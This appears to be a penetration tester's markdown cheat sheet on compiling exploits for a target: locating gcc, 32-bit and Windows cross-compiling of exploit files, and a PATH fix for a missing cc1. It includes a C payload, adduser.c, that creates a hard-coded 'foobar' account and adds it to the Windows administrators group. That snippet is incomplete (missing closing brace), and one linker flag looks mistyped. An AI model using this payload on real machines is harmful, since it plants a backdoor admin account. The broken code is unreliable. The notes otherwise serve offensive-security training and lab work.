#### Compiling

gcc not found on target?  Try:

```bash - target
find / -name gcc -type f 2>/dev/null
```

OR

==Remember you can locally compile if needed!==

64 bit compiling:
```bash - kali
gcc 15285.c -o 15285
```

i686 compiling:
```bash - kali
gcc 15285.c -o 15285 -m32
```

#### Multilib installation
```bash - kali
sudo apt-get install gcc-multilib -y
```

#### Windows cross compiling
![[Pasted image 20211230173000.png]]

```bash - kali
i686-w64-mingw32-gcc exploit.c  -o exploit -lsw2_32
```

```bash - kali
gcc -m32 -Wl,--hash-style=both 9545.c -o 9545
```

Compile code to add new user to administrators:
adduser.c:
```c - kali
#include <stdlib.h>
int main ()
{
int i;
i = system ("net user foobar Pass123 /add");
i = system ("net localgroup administrators foobar /add");
```

```bash - kali
i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

#### cc1 No such file or directory

![[Pasted image 20220220205911.png]]

```bash - target
locate cc1
```
OR
```bash - target
find / -iname cc1 2> /dev/null
```

> /usr/lib/gcc/i686-linux-gnu/5/cc1

Add ```/usr/lib/gcc/i686-linux-gnu/5/``` to PATH

```bash - target
export PATH="/usr/lib/gcc/i686-linux-gnu/5/:$PATH"
```







